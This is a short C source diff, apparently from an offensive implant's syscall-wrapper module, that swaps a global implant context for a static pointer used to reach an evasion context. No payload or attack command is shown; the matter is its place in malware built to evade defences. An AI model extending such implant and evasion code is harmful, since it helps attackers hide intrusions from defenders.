@@ -11,11 +11,21 @@
 #include "evasion.h"
 
 /* ------------------------------------------------------------------ */
-/*  Helper: get evasion context from global implant context             */
+/*  Static context pointer — set once during init, avoids extern        */
+/* ------------------------------------------------------------------ */
+
+static IMPLANT_CONTEXT *s_ctx = NULL;
+
+void syscall_wrappers_init(IMPLANT_CONTEXT *ctx) {
+    s_ctx = ctx;
+}
+
+/* ------------------------------------------------------------------ */
+/*  Helper: get evasion context from cached implant context pointer     */
 /* ------------------------------------------------------------------ */
 
 static EVASION_CONTEXT *get_evasion_ctx(void) {
-    return (EVASION_CONTEXT *)g_ctx.evasion_ctx;
+    return (EVASION_CONTEXT *)s_ctx->evasion_ctx;
 }
 
 /* ------------------------------------------------------------------ */
